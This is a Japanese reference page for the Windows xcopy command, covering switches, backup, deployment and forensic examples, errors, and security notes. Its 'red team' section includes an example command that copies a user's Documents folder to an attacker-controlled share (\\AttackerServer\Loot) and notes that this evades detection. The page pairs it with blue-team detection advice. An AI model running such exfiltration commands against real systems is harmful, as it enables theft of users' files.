# `xcopy` - ファイルとディレクトリツリーをコピーする

## 概要

`xcopy` コマンドは、ファイルとディレクトリツリーをコピーするためのコマンドラインユーティリティです。基本的な `copy` コマンドが単一ディレクトリ内のファイルしかコピーできないのに対し、`xcopy` はサブディレクトリを含めて再帰的にコピーできます。

**注**: `xcopy` は現在、より高機能で堅牢な `robocopy` によって置き換えられています。新規のスクリプトでは `robocopy` の使用が強く推奨されます。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| **`copy`** | `copy` はファイルのみを対象とし、ディレクトリ構造をコピーできません。`xcopy` はディレクトリツリーをコピーできます。 | `xcopy` |
| ⭐ **`robocopy`** | `robocopy` は `xcopy` の後継であり、ミラーリング、リトライ、ログ出力、マルチスレッドなど、はるかに多くの機能を持ち、より堅牢です。ファイルサーバーの移行やバックアップには `robocopy` が最適です。 | `robocopy` |

## よく連携されるコマンド

`xcopy` は、バッチファイル内で特定のディレクトリ構造を複製する際に、`if exist` や `mkdir` と連携して使用されます。

### シナリオ例: アプリケーションのデプロイ (インフラ構築・運用視点)

* **目的**: 開発環境からステージング環境へ、アプリケーションのファイル一式をデプロイ（コピー）する。
* **連携コマンド**: (バッチファイル内)
* **解説**: `/S /E /Y` は、空のディレクトリを含め、確認なしで全てのサブディレクトリをコピーする際の典型的な組み合わせです。
* **コマンド例**:

    ```cmd
    REM アプリケーションファイルをステージングサーバーにコピー
    xcopy C:\Dev\MyApp \\StagingServer\wwwroot\MyApp /S /E /Y /I
    ```

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **コピー元と先** | |
| ⭐ `<Source>` | コピー元のファイルまたはディレクトリを指定します。 |
| ⭐ `<Destination>` | コピー先のディレクトリまたはファイル名を指定します。 |
| **コピーオプション** | |
| ⭐ `/S` | 空ではないサブディレクトリをコピーします。 |
| ⭐ `/E` | 空のサブディレクトリも含めてコピーします。`/S` と共に使用することが多いです。 |
| ⭐ `/Y` | コピー先に同名のファイルが存在する場合、上書きの確認プロンプトを表示しません。 |
| `/-Y` | 上書きの確認プロンプトを表示します。 |
| ⭐ `/I` | コピー先が存在せず、コピーするファイルが複数の場合、コピー先をディレクトリとして扱います。 |
| `/C` | エラーが発生してもコピーを続行します。 |
| `/H` | 隠しファイルとシステムファイルもコピーします。 |
| `/K` | 属性をコピーします。通常、`xcopy` は読み取り専用属性をリセットします。 |
| `/R` | 読み取り専用ファイルを上書きします。 |
| **フィルタリング** | |
| ⭐ `/D[:mm-dd-yyyy]` | 指定した日付以降に変更されたファイルのみをコピーします。 |
| `/EXCLUDE:<file>` | 除外するファイルやディレクトリのリストを含むファイルを指定します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ユーザープロファイルの一部（例: ドキュメントフォルダ）をバックアップする。
* **組み合わせ**: `/S /E /C /H /R /Y`
* **解説**: 隠しファイルやシステムファイルを含め (`/H`)、読み取り専用ファイルも上書きし (`/R`)、エラーがあっても続行し (`/C`)、確認なしで (`/Y`)、ディレクトリ構造全体 (`/S /E`) をコピーする包括的なバックアップの組み合わせです。
* **例**:

    ```cmd
    REM ドキュメントフォルダをバックアップドライブにコピー
    xcopy "%USERPROFILE%\Documents" "D:\Backups\Documents" /S /E /C /H /R /Y
    ```

### 2. ブルーチーム視点

* **タスク**: **証拠保全 (Forensics)**。侵害されたホストから、特定のディレクトリを調査用ストレージに保全する。
* **組み合わせ**: `/S /E /H /K`
* **解説**: `xcopy` は `robocopy` ほどメタデータを保持しませんが、`/H` で隠しファイルを、`/K` で属性を維持しようとします。これにより、証拠の完全性をある程度保ちながらコピーできます。
* **例**:

    ```cmd
    REM マルウェアが作成したディレクトリを保全
    xcopy C:\Users\Public\Intel D:\Forensics\Case001\Intel /S /E /H /K
    ```

### 3. レッドチーム視点

* **タスク**: **データ窃取 (Data Exfiltration)**。機密情報が含まれていそうなディレクトリを、ネットワーク上のステージング場所に収集する。
* **組み合わせ**: `/S /E /C`
* **解説**: 攻撃者は侵入後、`xcopy` を使ってターゲットのディレクトリ（例: `My Documents`）を、自身がアクセスできるファイル共有などにコピーします。`xcopy` はWindows標準搭載であり、その実行は通常のファイル操作と見分けがつきにくいため、検知を回避しやすいです。
* **例**:

    ```cmd
    REM ユーザーのドキュメントを攻撃者の共有フォルダーにコピー
    xcopy "%USERPROFILE%\Documents" \\AttackerServer\Loot\%COMPUTERNAME%\ /S /E /C /Q
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Access denied`
    * **考えられる原因**: コピー元への読み取り権限、またはコピー先への書き込み権限がありません。
    * **解決策**: コマンドプロンプトを「管理者として実行」するか、`icacls` でアクセス権を確認・変更してください。

2. **プロンプト**: `Does <destination> specify a file name or directory name on the target? (F = file, D = directory)`
    * **考えられる原因**: `xcopy` は、コピー先が存在しない場合に、それがファイルなのかディレクトリなのかを判断できません。
    * **解決策**:
      * コピー先をディレクトリとして扱いたい場合は `D` を押します。
      * スクリプト内でこのプロンプトを抑制するには、`/I` スイッチを追加します。

## 環境変数と設定ファイル

* `xcopy` は、その動作に影響を与える特定の環境変数や設定ファイルを使用しません。
* 一般的な環境変数は、[CMD共通の環境変数・設定ファイル](./environment_and_config.md)で解説。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `xcopy` 自体ではなく、**ファイルの不正なコピー**が悪用されます。
* **悪用シナリオ**: レッドチームのシナリオで述べた通り、`xcopy` は攻撃者がデータを窃取したり、ラテラルムーブメントのためにツールをネットワーク内で拡散させたりするために利用されます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **データ収集 (Data Collection)**, **データ窃取 (Data Exfiltration)**
* **解説**: `xcopy.exe` はWindowsに標準搭載されており、強力なファイルコピー機能を持つため、攻撃者が内部ネットワークでファイル操作を行うための便利な「環境寄生型」ツールです。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ファイル共有やディレクトリに適切なACLを設定し、最小権限の原則を徹底する。
* **Detection (検知)**: `xcopy.exe` の実行、特に機密性の高いファイルサーバーやドメインコントローラーに対する実行を、プロセス監査ログやEDRで監視する。予期せぬ大量のファイル読み取りやネットワーク転送を監視する。

## 注意点・補足

* **`robocopy`への移行**: `xcopy` は多くのシナリオで機能しますが、`robocopy` の方がはるかに信頼性が高く、機能も豊富です。特に重要なデータのコピーや同期には、`robocopy` を使用してください。
